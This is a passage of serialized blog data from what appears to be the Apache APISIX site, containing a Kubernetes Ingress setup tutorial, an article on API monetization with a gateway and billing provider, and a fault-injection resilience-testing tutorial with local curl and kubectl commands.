2022","tags":[{"label":"Ingress","permalink":"/blog/tags/ingress"},{"label":"Kubernetes","permalink":"/blog/tags/kubernetes"}],"readingTime":4.99,"truncated":true,"authors":[{"name":"Navendu Pottekkat","title":"Author","url":"https://github.com/navendu-pottekkat","image_url":"https://avatars.githubusercontent.com/u/49474499","imageURL":"https://avatars.githubusercontent.com/u/49474499"}],"prevItem":{"title":"Why Is Apache APISIX the Best API Gateway?","permalink":"/blog/2022/09/13/why-is-apache-apisix-the-best-api-gateway"},"nextItem":{"title":"API monetization using an API Management and a billing provider","permalink":"/blog/2022/09/08/api-monetization-using-stack"}},"content":"> A tutorial on using Ingress in your Kubernetes cluster with Apache APISIX.\\n\\n\x3c!--truncate--\x3e\\n\\n<head>\\n    <link rel=\\"canonical\\" href=\\"https://navendu.me/posts/hands-on-set-up-ingress-on-kubernetes-with-apache-apisix-ingress-controller/\\" />\\n</head>\\n\\nIn Kubernetes, [Ingress](https://kubernetes.io/docs/concepts/services-networking/ingress/) is a native object that allows you to access your services externally by defining a set of rules. Using a reverse proxy, an [Ingress controller](https://kubernetes.io/docs/concepts/services-networking/ingress-controllers/) implements these defined rules and routes external traffic to your services.\\n\\n![Ingress controller](https://static.apiseven.com/2022/09/05/6315bd0573d30.jpg)\\n\\n[Apache APISIX](https://apisix.apache.org/) is an open source API gateway (a souped-up reverse proxy) that provides features like authentication, traffic routing, load balancing, canary releases, monitoring, and more. APISIX also supports custom Plugins and integrates with popular open source projects like [Apache SkyWalking](https://apisix.apache.org/docs/apisix/next/plugins/skywalking/) and [Prometheus](https://apisix.apache.org/docs/apisix/next/plugins/prometheus/). To learn more about APISIX, you can see the [official documentation](https://apisix.apache.org/docs/apisix/getting-started/).\\n\\nThe [Apache APISIX Ingress controller](https://apisix.apache.org/docs/ingress-controller/next/getting-started/) sits between the defined Ingress rules and the APISIX API gateway. It configures the proxy to route traffic based on the defined rules.\\n\\n![APISIX Ingress controller](https://static.apiseven.com/2022/09/05/6315bd04245df.jpg)\\n\\nThis hands-on tutorial will teach you how to set up the APISIX Ingress controller on your Kubernetes cluster and route traffic to your services.\\n\\nBefore you move on, make sure you:\\n\\n1. Have access to a Kubernetes cluster. This tutorial uses [minikube](https://minikube.sigs.k8s.io/) for creating a cluster.\\n2. Install and configure `kubectl` to communicate with your cluster.\\n3. [Install Helm](https://helm.sh/docs/intro/install/) to deploy the APISIX Ingress controller.\\n\\n## Deploying a Sample Application\\n\\nWe will use a sample HTTP server application ([bare-minimum-api](https://github.com/navendu-pottekkat/bare-minimum-api)) to demonstrate the working of the Ingress controller.\\n\\nWhile running the application, you can set a \\"version\\" and a port to listen to. For this example, we will create two \\"versions\\" of this application which will return different responses as shown below:\\n\\n![Sample application](https://static.apiseven.com/2022/09/05/6315bd05e15cd.jpg)\\n\\nYou can deploy the application on your Kubernetes cluster by running:\\n\\n```shell\\nkubectl run bare-minimum-api-v1 --image navendup/bare-minimum-api --port 8080 -- 8080 v1.0\\nkubectl expose pod bare-minimum-api-v1 --port 8080\\n```\\n\\nTo test the application outside the cluster, you can use `port-forward`:\\n\\n```shell\\nkubectl port-forward bare-minimum-api-v1 8080:8080\\n```\\n\\nNow, if you open up a new terminal window and run:\\n\\n```shell\\ncurl http://127.0.0.1:8080\\n```\\n\\nYou will get back a response from the application:\\n\\n```shell {title=\\"output\\"}\\nHello from API v1.0!\\n```\\n\\nSimilarly, you can deploy another \\"version\\" of the application by running:\\n\\n```shell\\nkubectl run bare-minimum-api-v2 --image navendup/bare-minimum-api --port 8081 -- 8081 v2.0\\nkubectl expose pod bare-minimum-api-v2 --port 8081\\n```\\n\\nNow, we can deploy APISIX Ingress and expose these applications to external traffic.\\n\\n## Deploying APISIX Ingress\\n\\nAPISIX and APISIX Ingress controller can be installed using Helm:\\n\\n```shell\\nhelm repo add apisix https://charts.apiseven.com\\nhelm repo add bitnami https://charts.bitnami.com/bitnami\\nhelm repo update\\nkubectl create ns ingress-apisix\\nhelm install apisix apisix/apisix \\\\\\n  --set gateway.type=NodePort \\\\\\n  --set ingress-controller.enabled=true \\\\\\n  --namespace ingress-apisix \\\\\\n  --set ingress-controller.config.apisix.serviceNamespace=ingress-apisix\\nkubectl get pods --namespace ingress-apisix\\n```\\n\\n:::note\\n\\nWe are using `NodePort` as the Gateway service type. You can also set it to `LoadBalancer` if your cluster has one.\\n\\n:::\\n\\nHelm will create five resources in your cluster:\\n\\n1. `apisix-gateway`: The data plane that handles external traffic.\\n2. `apisix-admin`: Control plane that processes configuration changes.\\n3. `apisix-ingress-controller`: The ingress controller.\\n4. `apisix-etcd` and 5. `apisix-etcd headless`: To store configuration and handle internal communication.\\n\\nOnce all the pods and services are running, you can test APISIX by accessing the Admin API:\\n\\n```shell\\nkubectl exec -n ingress-apisix deploy/apisix -- curl -s http://127.0.0.1:9180/apisix/admin/routes -H \'X-API-Key: edd1c9f034335f136f87ad84b625c8f1\'\\n```\\n\\nIf you get a response similar to the one shown below, APISIX is up and running:\\n\\n```json {title=\\"output\\"}\\n{\\n  \\"action\\": \\"get\\",\\n  \\"node\\": {\\n    \\"key\\": \\"/apisix/routes\\",\\n    \\"dir\\": true,\\n    \\"nodes\\": []\\n  },\\n  \\"count\\": 0\\n}\\n```\\n\\n## Configuring APISIX Ingress\\n\\nOnce you have verified that the APISIX gateway and Ingress controller is running, you can create [Routes](https://apisix.apache.org/docs/apisix/terminology/route/) to expose the deployed application to external traffic.\\n\\nThis will route traffic between the two application versions based on the client request:\\n\\n![Configuring APISIX Ingress](https://static.apiseven.com/2022/09/05/6315bd0296577.jpg)\\n\\n![Configuring APISIX](https://static.apiseven.com/2022/09/05/6315bd04c542c.jpg)\\n\\nTo configure Routes, APISIX comes with declarative and easy-to-use [custom resource](https://apisix.apache.org/docs/ingress-controller/next/references/apisix_route_v2beta3/):\\n\\n```yaml {title=\\"apisix-ingress-manifest.yaml\\"}\\napiVersion: apisix.apache.org/v2beta3\\nkind: ApisixRoute\\nmetadata:\\n  name: api-routes\\nspec:\\n  http:\\n    - name: route-1\\n      match:\\n        hosts:\\n          - local.navendu.me\\n        paths:\\n          - /v1\\n      backends:\\n        - serviceName: bare-minimum-api-v1\\n          servicePort: 8080\\n    - name: route-2\\n      match:\\n        hosts:\\n          - local.navendu.me\\n        paths:\\n          - /v2\\n      backends:\\n        - serviceName: bare-minimum-api-v2\\n          servicePort: 8081\\n```\\n\\nThe APISIX Ingress controller converts this resource to an APISIX gateway configuration.\\n\\nAPISIX also supports configuration using native [Kubernetes Ingress resource](https://kubernetes.io/docs/concepts/services-networking/ingress/#the-ingress-resource):\\n\\n```yaml {title=\\"kubernetes-ingress-manifest.yaml\\"}\\napiVersion: networking.k8s.io/v1\\nkind: Ingress\\nmetadata:\\n  name: api-routes\\nspec:\\n  ingressClassName: apisix\\n  rules:\\n    - host: local.navendu.me\\n      http:\\n        paths:\\n          - backend:\\n              service:\\n                name: bare-minimum-api-v1\\n                port:\\n                  number: 8080\\n            path: /v1\\n            pathType: Exact\\n          - backend:\\n              service:\\n                name: bare-minimum-api-v2\\n                port:\\n                  number: 8081\\n            path: /v2\\n            pathType: Exact\\n```\\n\\nYou can use either to configure APISIX but I prefer the easier APISIX custom resource. We can apply this manifest file to our cluster to create Routes in APISIX:\\n\\n```shell\\nkubectl apply -f apisix-ingress-manifest.yaml\\n```\\n\\nIf the Ingress controller is configured correctly, you should see a response indicating that APISIX API gateway has been configured:\\n\\n```shell {title=\\"output\\"}\\napisixroute.apisix.apache.org/api-routes created\\n```\\n\\nNow, let\'s test these Routes.\\n\\n## Testing the Created Routes\\n\\nIf you were following along using minikube and `NodePort`, you should be able to access APISIX through the Node IP of the service `apisix-gateway`. If the Node IP is not reachable directly (if you are on Darwin, Windows, or WSL), you can create a tunnel to access the service on your machine:\\n\\n```shell\\nminikube service apisix-gateway --url -n ingress-apisix\\n```\\n\\nThis will show the URL with which you can access the `apisix-gateway` service.\\n\\nYou can send a `GET` request to this URL and it would be Routed to the appropriate service:\\n\\n```shell\\ncurl http://127.0.0.1:51538/v2 -H \'host:local.navendu.me\'\\n```\\n\\n```shell {title=\\"output\\"}\\nHello from API v2.0!\\n```\\n\\nNow you have APISIX routing traffic to your applications! You can try the two configured Routes and see APISIX routing the requests to the appropriate application.\\n\\n## What\'s Next?\\n\\nIn this tutorial, you learned to set up APISIX Ingress on your cluster. We tested it out by configuring basic Routes to a sample application.\\n\\nWith APISIX gateway and the Ingress controller, you can also configure Upstreams, Plugins, mTLS, and monitoring. To learn more about APISIX and how you can use these features, visit [apisix.apache.org](https://apisix.apache.org)."},{"id":"API monetization using an API Management and a billing provider","metadata":{"permalink":"/blog/2022/09/08/api-monetization-using-stack","source":"@site/blog/2022/09/08/api-monetization-using-stack.md","title":"API monetization using an API Management and a billing provider","description":"\ud83d\udc81\ud83c\udffc This blog post gives you an idea of building your technology stack with an API Gateway and a payment provider that can help you run quickly and securely your API monetization system which simply provides flexibility for your customers.","date":"2022-09-08T00:00:00.000Z","formattedDate":"September 8, 2022","tags":[{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"}],"readingTime":8.255,"truncated":true,"authors":[{"name":"Bobur Umurzokov","title":"Author","url":"https://github.com/Boburmirzo","image_url":"https://avatars.githubusercontent.com/u/14247607","imageURL":"https://avatars.githubusercontent.com/u/14247607"}],"prevItem":{"title":"Hands-On: Set Up Ingress on Kubernetes With Apache APISIX Ingress Controller","permalink":"/blog/2022/09/09/kubernetes-ingress-with-apisix"},"nextItem":{"title":"Fault Injection Testing with API Gateway","permalink":"/blog/2022/08/28/fault-injection-testing-with-api-gateway"}},"content":"> \ud83d\udc81\ud83c\udffc This blog post gives you an idea of building your technology stack with an [API Gateway](https://apisix.apache.org/docs/apisix/terminology/api-gateway/) and a [payment provider](https://en.wikipedia.org/wiki/List_of_online_payment_service_providers) that can help you run quickly and securely your API monetization system which simply provides flexibility for your customers.\\n\\n\x3c!--truncate--\x3e\\n\\n![Api Monetization Technological Stack](https://static.apiseven.com/2022/09/08/63199c499a244.png)\\n\\n## API Monetization\\n\\nAs an owner of API, you develop some code and deploy it to a server. That server might have a bunch of HTTP/HTTPs endpoints that do something useful. Maybe like retrieving data about all current discounts and voucher information from different markets in your city. And other developers want to use this data but they do not want to implement the same solution on their own. So, they reach out to you for permission to make requests to your server.\\n\\nUsing **APIs** is an ideal way to **monetize your services**. An API lets you reach customers through multiple channels and allows third-party applications or developers to consume your data. API monetization is a way that businesses can use APIs to convert usages of the data into money \ud83d\udcb8. When it comes to making money from your APIs, there are multiple ways. Most often you think about how to get started with the right tools and how to set up billing for your APIs.\\n\\n### Here is a quick overview of what we covered \ud83d\udc47\\n\\n- \u2705 Monetization options.\\n- \u2705 Two common ways to monetize APIs.\\n- \u2705 Simple API monetization stack components: an API Management and a billing provider.\\n- \u2705 How API Management and a payment platform work together.\\n- \u2705 How to apply rate limiting policies.\\n- \u2705 How Apache APISIX can be useful to monitor and limit API usage.\\n\\n![APISIX API Monetization](https://static.apiseven.com/2022/09/08/63199c4a813a7.png)\\n\\n## API monetization models\\n\\nThere are several pricing approaches you can take for monetization. When you are developing **API monetization strategies**, you should always consider that you deliver high-quality, consistent value to your API users. As the API Provider, you talk to your current API users to identify problems your service is solving and offer pricing models according to the target customer. For example, if customers use one specific feature of your API more than others, you could spin that feature off into its own product with its own pricing plan.\\n\\n![API Monetization customer agreement](https://static.apiseven.com/2022/09/08/63199c4a07f63.png)\\n\\nSome API billing models for monetization include:\\n\\n- [Freemium](https://en.wikipedia.org/wiki/Freemium).\\n- [Pay as you go](https://en.wikipedia.org/wiki/Pay-as-you-use).\\n- [Subscription](https://en.wikipedia.org/wiki/Subscription_business_model).\\n- [Pay-per-transaction](https://en.wikipedia.org/wiki/Pay_per_sale).\\n- [Revenue share](https://en.wikipedia.org/wiki/Revenue_sharing).\\n- [Pay for ad-free content](https://en.wikipedia.org/wiki/Pay-per-click).\\n- [Paid partner](https://www.softwareag.com/en_corporate/resources/what-is/api-monetization.html#:~:text=low%2Dcost%20apps.-,Paid%20partner%3A,-In%20this%20model).\\n\\n![API Monetization models](https://static.apiseven.com/2022/09/08/63199c603bd09.png)\\n\\nIn the freemium model, Developers have access to a basic API for free up to a specific threshold and transition to pay-per-use in a tiered pricing model when they exceed that limit. This model is quite often used to explore API use cases, test your APIs, or make quick a proof of concept. You can learn more about other models in depth [here](https://www.softwareag.com/en_corporate/resources/what-is/api-monetization.html).\\n\\n## Two common ways to monetize APIs\\n\\nLet\u2019s take a look closely at the most common ways to directly monetize your APIs like the **Subscription billing model**, where you charge your customers a flat monthly fee to access your APIs; and **Metered billing model**, where you charge your customers based on the number of API calls they make.\\n\\n### Subscription Billing Model\\n\\nIn this model, API Consumer pays for a set of numbers of calls per month. For example, a consumer pays $100 to access up to 10,000 API calls per month. Whether they make 0 API calls or 10,000 API calls, the consumer is charged $100 each month.\\n\\n### Metered Billing Model\\n\\nWith a **Metered Billing model**, API Consumers can make as many calls as they want per month and you only charge the consumer a fee for each API call they make. If the customer makes 7,000 API calls at $0.01 per call then the bill at the end of the month would be $70.\\n\\n### Calculating bills\\n\\nCalculating bills in subscription-based pricing model is very straightforward because you don\u2019t need to count how many API calls were made. Instead, you charge each user a flat monthly fee. However, calculating bills for metered users might be a little bit challenging since we need to have custom code in your API service that not only tracks API usage but it should be also capable of applying rate limiting policies to the APIs depending on users accessing your APIs.\\n\\n![Calculating bills](https://static.apiseven.com/2022/09/08/63199ca23e5bc.png)\\n\\nIn this case, we might need to consider a suitable API monetization stack with existing solutions to build a solid foundation for your API monetization that reduces the time and investment required to build your own service to measure API usage.\\n\\n## Two simple API monetization stack components\\n\\nWe can choose the combination of two elements for our API monetization stack that most modern businesses are using nowadays: API Management like **an API Gateway** and **a billing provider**. Let\u2019s break down each component and understand the role of each in API monetization.\\n\\n### API Management\\n\\nAPI Management service itself offers two helpful features such as _API Gateway and API Analytics_). **API analytics feature** can be used for tracking API usage because the analytics is able to collect API consumption metrics around every API call\xa0made by each of your API consumers. This usage data can be used to bill each consumer and send an invoice to collect monthly payments.\\n\\nFor example, [Apache APISIX](https://apisix.apache.org/) can also integrate with a variety of observability platforms like [Prometheus](https://prometheus.io/), [OpenTelemetry](https://opentelemetry.io/), [Apache Skywalking](https://skywalking.apache.org/) and etc. by using its [connector plugins](https://apisix.apache.org/plugins/) \ud83d\udd0c to further analyze API performance and gain complete visibility.\\n\\n**API Gateway** can help with the challenges that you meet with implementing cross-cutting concerns for APIs. As an API Gateway acts as a central proxy to route all incoming requests from your clients to intended destinations (backend services), it can make securing and managing your APIs much easier. Most gateways support a wide variety of authorization and authentication protocols to control API access, caching mechanisms for API responses, or support for rate limiting and exposing quotas with API usage details. \xa0\\n\\nThere are many popular open-source projects available like [Apache APISIX](https://apisix.apache.org/) or alternative enterprise SaaS solutions such as [Azure API Management](https://docs.microsoft.com/en-us/azure/api-management/), [API7 Cloud](https://api7.ai/cloud) in a public cloud. You can investigate the pros and cons of each to choose the more suitable one for your needs.\\n\\n![Apache APISIX API Gateway](https://static.apiseven.com/2022/09/08/63199cc33bd68.png)\\n\\n#### Apply rate limit policies\\n\\nResources cost money \ud83d\udcb0. We can protect an API by adding _a rate limit policy_ with Apache APISIX as it is a basic step toward API Monetization. Apache APISIX allows you to set throttling limits per each API consumer and quotas to your APIs and allows you to control third-party usage of your API by ensuring you are able to monetize your API.\\n\\nAPISIX uses its `limit-count` (_rate limiting_) plugin. [API rate limiting plugin](https://apisix.apache.org/docs/apisix/plugins/limit-count/) can prevent an API not only from being overwhelmed or from possible malicious attacks but also it can enforce a limit on the number of data clients can consume. Later you can charge API consumers by the quantity of data used (the number of requests).\\n\\nWith the help of APISIX `rate-limiting` plugin, you can also configure the different rate limits for authenticated and unauthenticated requests. It also defines the limit quota in the [response headers](https://apisix.apache.org/docs/apisix/plugins/limit-count/) to track the maximum number of requests you are permitted to make or the number of requests remaining in the current rate limit window.\\n\\nRefer to the documentation to understand [Consumer concept](https://apisix.apache.org/docs/apisix/terminology/consumer/) and learn the different ways to set up [rate limiting](https://apisix.apache.org/docs/apisix/plugins/limit-count/) with Apache APISIX.\\n\\n### A billing provider\\n\\nNext, for your API monetization stack, you need a 3rd-party recurring billing solution, such as [Stripe](https://stripe.com/en-gb-ee), [Recurly](https://recurly.com/), [Hypercurrent](https://www.hypercurrent.io/), and many more. But again, we do not recommend any particular payment service in this post and leave the choice of which payment provider to use up to you. The billing provider obviously needs to receive usage charges for each customer, issue an invoice, and support multiple billing models, currencies \ud83d\udcb5 \ud83d\udcb4 \ud83d\udcb6 \ud83d\udcb7, and payment methods.\\n\\n### How API Management and a billing platform work together\\n\\nTo make these two API monetization components work well together, you need to integrate API Management and billing software. For instance, Apache APISIX tracks API usage in real-time\xa0saves consumption details and exposes a dedicated endpoint with an API usage report. On the other hand, the billing provider enables you to send a monthly invoice to each of your consumer\u2019s API usage.\\n\\nYou\u2019ll also want to be aware of what it takes to integrate the billing provider with your current solution by considering the fact that different providers have different ways to integrate mainly through _API communication_. We will describe the integration process with Apache APISIX with a step-by-step tutorial in our next post in this series.\\n\\n## Conclusion\\n\\nAs we went through the post, there is an effortless way to monetize your API that consists of two components an API Management service and a billing provider.\xa0 To get started, identify your API monetization model as the first step. Next, manage your APIs with an API Gateway, and set throttling limits and quotas to your APIs. Then, choose a proper payment provider to deal with processing payment transactions, issuing invoices, and managing subscriptions. On a later stage, apply API analytics to your system so you can monitor API usage and scale it as needed. You can review the analytics reports regularly to understand how your monetization strategy is being adopted by API consumers.\\n\\n### Related resources\\n\\n\u2794 [What is API monetization?](https://www.softwareag.com/en_corporate/resources/what-is/api-monetization.html).\\n\\n\u2794 [Best SaaS Subscription Billing Solution](https://www.zeni.ai/blog/best-saas-subscription-billing-solution-chargebee-vs-recurly-vs-stripe-billing).\\n\\n\u2794 [API Monetization Models](https://medium.com/@madhukaudantha/api-monetization-models-f9d21c95bdc8).\\n\\n### Recommended content \ud83d\udc81\\n\\n\u2794 Watch Video Tutorial:\\n\\n- [Getting Started with Apache APISIX](https://youtu.be/dUOjJkb61so).\\n  \\n- [APIs security with Apache APISIX](https://youtu.be/hMFjhwLMtQ8).\\n\\n\u2794 Read the blog posts:\\n\\n- [Overview of Apache APISIX API Gateway Plugins](https://dev.to/apisix/overview-of-apache-apisix-api-gateway-plugins-2m8o).\\n\\n- [API Observability with Apache APISIX Plugins](https://dev.to/apisix/apis-observability-with-apache-apisix-plugins-1bnm).\\n\\n### Community\u2935\ufe0f\\n\\n\ud83d\ude4b [Join the Apache APISIX Community](https://apisix.apache.org/docs/general/join/)\\n\ud83d\udc26 [Follow us on Twitter](https://twitter.com/ApacheAPISIX)\\n\ud83d\udcdd [Find us on Slack](https://join.slack.com/t/the-asf/shared_invite/zt-vlfbf7ch-HkbNHiU_uDlcH_RvaHv9gQ)\\n\ud83d\udce7 [Mail to us](dev@apisix.apache.org) with your questions."},{"id":"Fault Injection Testing with API Gateway","metadata":{"permalink":"/blog/2022/08/28/fault-injection-testing-with-api-gateway","source":"@site/blog/2022/08/28/fault-injection-testing-with-api-gateway.md","title":"Fault Injection Testing with API Gateway","description":"The blog post describes how Apache APISIX is useful for testing the robustness and resilience of microservices APIs. Throughout the post, we also get to know the types of possible failure injections with the Fault Injection Plugin.","date":"2022-08-28T00:00:00.000Z","formattedDate":"August 28, 2022","tags":[{"label":"Plugins","permalink":"/blog/tags/plugins"}],"readingTime":7.285,"truncated":true,"authors":[{"name":"Bobur Umurzokov","title":"Author","url":"https://github.com/Boburmirzo","image_url":"https://avatars.githubusercontent.com/u/14247607","imageURL":"https://avatars.githubusercontent.com/u/14247607"}],"prevItem":{"title":"API monetization using an API Management and a billing provider","permalink":"/blog/2022/09/08/api-monetization-using-stack"},"nextItem":{"title":"Backend-for-Frontend: the demo","permalink":"/blog/2022/08/17/backend-for-frontend-demo"}},"content":"> \ud83d\udc81 This blog post describes how an **API Gateway** like [Apache APISIX](https://apisix.apache.org/) is useful for testing the robustness and resilience of microservices APIs.\\n\\n\x3c!--truncate--\x3e\\n\\n## Explore distributed system stability \ud83d\udcaa\\n\\n[Distributed systems](https://azure.microsoft.com/en-us/resources/designing-distributed-systems/) such as [microservices](https://docs.microsoft.com/en-us/azure/architecture/guide/architecture-styles/microservices) have led to an increase in the complexity of the systems we work with. It is difficult to have full confidence in this architecture when there are many components and \u201ca lot of moving parts\u201d that could potentially fail. It is critical to handle failures in service-to-service calls gracefully. Also, we want to be sure that any resilience mechanisms we have in place such as error handling code, [circuit breaker](https://dev.to/apisix/implementing-resilient-applications-with-api-gateway-circuit-breaker-ggk), [health checks](https://dev.to/apisix/implementing-resilient-applications-with-api-gateway-health-check-338c), [retry](https://docs.microsoft.com/en-us/azure/architecture/patterns/retry), fallback, redundant instances, and so on. We can verify this with the help of the testing method **[Fault Injection](https://en.wikipedia.org/wiki/Fault_injection)** \ud83d\udc89.\\n\\n![Fault Injection Testing with Apache APISIX](https://static.apiseven.com/2022/blog/0831/afe53i95g4tt82rx8gwp.jpg)\\n\\nThroughout the post, we get to know the types of possible failure injections with the **[Fault Injection Plugin](https://apisix.apache.org/docs/apisix/plugins/fault-injection/)** \ud83d\udd0c and simulate failures on our existing [Product backend service](https://github.com/Boburmirzo/apisix-dotnet-docker/tree/main/ProductApi) (developed by using [ASP.NET Core WEB API](https://docs.microsoft.com/en-us/aspnet/core/?view=aspnetcore-6.0)).\\n\\n### Here is a quick overview of what we cover \ud83d\udc47\\n\\n- \u2705 [Software Fault Injection](https://www.intechopen.com/chapters/56668).\\n- \u2705 Fault injection testing (FIT) with API Gateway.\\n- \u2705 Apache APISIX [Fault Injection Plugin](https://apisix.apache.org/docs/apisix/plugins/fault-injection/).\\n- \u2705 Fault injection different types of failures.\\n- \u2705 Experiment with Fault Injection Plugin.\\n\\n> Application is **correct** if it acts as specified. It is **robust** if it can take a high load until it goes down. Application is **resilient** if it can go back to normal after a disruption.\\n\\n## Software Fault Injection \ud83d\udcbb\ud83d\udc89\\n\\nAmong the many methods to perform Fault Injection, the technique of **Software Fault Injection** is especially getting more popular among companies managing large, complex, and distributed systems. In this software testing technique, a special piece of code associated with the system under test tries to simulate faults. It is usually completed before deployment to identify potential flaws in the running software \ud83d\ude31. Fault injection can better identify the nature and cause of production failures.\\n\\n## Fault Injection Testing with API Gateway\\n\\nThe **fault injection** approach at the [API Gateway](https://apisix.apache.org/docs/apisix/terminology/api-gateway/) level can be used to test the resiliency of application or microservices APIs against various forms of failures to build confidence in the production environment. The technique can be used to inject delays and abort requests with user-specified error codes, thereby providing the ability to stage different failure scenarios such as service failures, service overloads, high network latency, network partitions, etc. Fault injection can be limited to a specific set of requests based on the (destination) upstream cluster of a request and/or a set of pre-defined request headers.\\n\\nFor a streaming giant like [Netflix](https://www.netflix.com/), the migration to a complex cloud-based microservices architecture would not have been possible without a revolutionary testing method known as fault injection \ud83d\udc4a. There is a very well-known strategy like [Chaos engineering](https://en.wikipedia.org/wiki/Chaos_engineering) which uses fault injection to accomplish the goal of more reliable systems. And Netflix teams built their own _Chaos engineering tool_ called [Chaos Monkey](https://netflix.github.io/chaosmonkey/).\\n\\n## Apache APISIX Fault Injection Plugin \ud83d\udd0c\\n\\n[Apache APISIX Fault Injection Plugin](https://apisix.apache.org/docs/apisix/plugins/fault-injection/) also offers a _mechanism_ to inject some errors into our APIs and ensures that our resilience measures are effective.\\n\\nApache APISIX works in **two different modes**, both configured using the `fault-injection` plugin attributes\u2935\ufe0f:\\n\\n1. **Delays:** Delays are timing failures. They simulate increased network latency or an overloaded upstream service.\\n\\n2. **Aborts:** Aborts are crash failures. They mimic failures in upstream services. Aborts usually manifest in the form of HTTP error codes or TCP connection failures.\\n\\nFor detailed instructions on how to configure delays and aborts, see [Fault Injection](https://apisix.apache.org/docs/apisix/plugins/fault-injection/). You can also try out a centralized platform [API7 Cloud](https://www.api7.cloud/) \u2601\ufe0f to use more advanced API Gateway [features](https://www.api7.cloud/docs/overview/api7-cloud). API7 Cloud provides a fully managed chaos engineering service with the dashboard to configure the [Fault Injection policy](https://www.api7.cloud/docs/references/policies/traffic-management/fault-injection) easily\ud83d\udc4d\ud83c\udffb.\\n\\n## Experiment with the Fault Injection Plugin \ud83d\udd2c\\n\\nThis part shows you how to inject faults to test the resiliency of your application.\\n\\n### Before you begin \ud83d\ude45\\n\\n\u261d\ufe0f Familiarize yourself with the [fault injection concept](https://microsoft.github.io/code-with-engineering-playbook/automated-testing/fault-injection-testing/).\\n\u261d\ufe0f If you followed the previous blog post about [Manage .NET Microservices APIs with Apache APISIX API Gateway](https://dev.to/apisix/manage-net-microservices-apis-with-apache-apisix-api-gateway-2cbk), make sure you have read it and completed the steps to set up `APISIX, etcd and ASP.NET WEB API` before continuing with a demo session. Or you can see the complete source code on [Github](https://github.com/Boburmirzo/apisix-dotnet-docker) and the instruction on how to build a multi-container APISIX via Docker CLI.\\n\\n### Understand the demo scenario\\n\\nI assume that you have the demo project [apisix-dotnet-docker](https://github.com/Boburmirzo/apisix-dotnet-docker) up and running. In the ASP.NET Core project, there is a simple API to get all products list from the service layer in [ProductsController.cs](https://github.com/Boburmirzo/apisix-dotnet-docker/blob/main/ProductApi/Controllers/ProductsController.cs) file.\\n\\nLet\u2019s suppose that we have an _online shopping sample application_ that consists of many microservices such as `Catalog, Product, Order and etc`. When we are retrieving data about products belonging to a specific catalog, there will be service-to-service interaction between Catalog and Product services. In this case, something might go wrong due to any number of reasons.\\n\\n![FIT with Apache APISIX](https://static.apiseven.com/2022/blog/0831/s3a82cmrr84vyqvceuwp.jpg)\\n\\nTo test the shopping application\u2019s microservices for resiliency, we are going to simulate the product service misbehaving as a faulty service:\\n\\n- By adding a **delay** to the HTTP request.\\n- By **aborting** the HTTP requests and returning a custom status code.\\n\\n### Injecting an HTTP delay fault\\n\\nIn the first example, we introduce a 5-second delay for every request to the product service to test if we correctly set a connection timeout for calls to the product service from the Catalog service.\\n\\n> Note that you can also specify the percentage of requests to be delayed in numbers. Like 10 means: _10% of overall requests will be delayed_. In our demo case, we made it 100% to easily test the delay in time.\\n\\nThe following route configuration example creates a new upstream for our backend service (productapi) that runs on port `80`, and registers a route with the `fault-injection` plugin enabled. You can notice that we set the delay injection in the plugin settings:\\n\\n``` shell\\ncurl http://127.0.0.1:9080/apisix/admin/routes/1 \\\\\\n-H \'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1\' -X PUT -d \'\\n{\\n  \\"name\\": \\"Route for Fault Injection with the delay\\",\\n  \\"methods\\": [\\n    \\"GET\\"\\n  ],\\n  \\"uri\\": \\"/api/products\\",\\n  \\"plugins\\": {\\n    \\"fault-injection\\": {\\n      \\"delay\\": {\\n        \\"duration\\": 5,\\n        \\"percentage\\": 100\\n      }\\n    }\\n  },\\n  \\"upstream\\": {\\n    \\"type\\": \\"roundrobin\\",\\n    \\"nodes\\": {\\n      \\"productapi:80\\": 1\\n    }\\n  }\\n}\'\\n```\\n\\nBelow we confirm the rule was created by running another `curl` command with the time measurement:\\n\\n``` bash\\ntime curl http://127.0.0.1:9080/api/products -i\\n```\\n\\nAfter you run the cmd, you will see there is some delay was introduced:\\n\\n``` text\\nHTTP/1.1 200 OK\\nContent-Type: application/json; charset=utf-8\\nTransfer-Encoding: chunked\\nConnection: keep-alive\\n\\n[{\\"name\\":\\"Macbook Pro\\",\\"price\\":1500.9},{\\"name\\":\\"SurfaceBook 3\\",\\"price\\":1599.9}]\\nreal    0m5.004s\\nuser    0m0.004s\\nsys     0m0.000s\\n```\\n\\nThe result of fault injection is as we expected.\ud83d\udc4f\\n\\n### Injecting an HTTP abort fault\\n\\nIn the following example, we will introduce an HTTP abort to the product microservice to check how our imaginary Catalog service responds\xa0immediately to the failures introduced by the dependent service. Let\u2019s say when the Product service fails, we should expect an HTTP error with the `Product service\xa0currently unavailable` error message.\\n\\nWe can test it in action. Now we can enable abort injection with the following route settings.\\n\\n``` shell\\ncurl http://127.0.0.1:9080/apisix/admin/routes/1 \\\\\\n-H \'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1\' -X PUT -d \'\\n{\\n  \\"name\\": \\"Route for Fault Injection with the abort\\",\\n  \\"methods\\": [\\n    \\"GET\\"\\n  ],\\n  \\"uri\\": \\"/api/products\\",\\n  \\"plugins\\": {\\n    \\"fault-injection\\": {\\n      \\"abort\\": {\\n        \\"http_status\\": 503,\\n        \\"body\\": \\"The product service is currently unavailable.\\",\\n        \\"percentage\\": 100\\n      }\\n    }\\n  },\\n  \\"upstream\\": {\\n    \\"type\\": \\"roundrobin\\",\\n    \\"nodes\\": {\\n      \\"productapi:80\\": 1\\n    }\\n  }\\n}\'\\n```\\n\\nIf you run `curl cmd` to hit the APISIX route, now it quickly responds with HTTP 503 error which in turn very comfortable to test catalog service how it reacts to such kind of server errors from downstream services.\\n\\n``` shell\\ncurl  http://127.0.0.1:9080/api/products -i\\n\\nHTTP/1.1 503 Service Temporarily Unavailable\\nContent-Type: text/plain; charset=utf-8\\nTransfer-Encoding: chunked\\nConnection: keep-alive\\nServer: APISIX/2.13.1\\n```\\n\\nWith that we can finalize our demo example.\\n\\n## Summary\\n\\nAs we learned, by using the fault injection method, engineers can build better and more stable systems. And open source projects like [Apache APISIX](https://apisix.apache.org/) make it more accessible for us to some fault injection testing techniques and helps you to plan for unknown failures in the distributed architecture.\\n\\n## Related resources\\n\\n\u2794 [Implementing resilient applications with API Gateway (Circuit breaker)](https://dev.to/apisix/implementing-resilient-applications-with-api-gateway-circuit-breaker-ggk).\\n\\n\u2794 [Implementing resilient applications with API Gateway (Health Check)](https://dev.to/apisix/implementing-resilient-applications-with-api-gateway-health-check-338c).\\n\\n## Recommended content 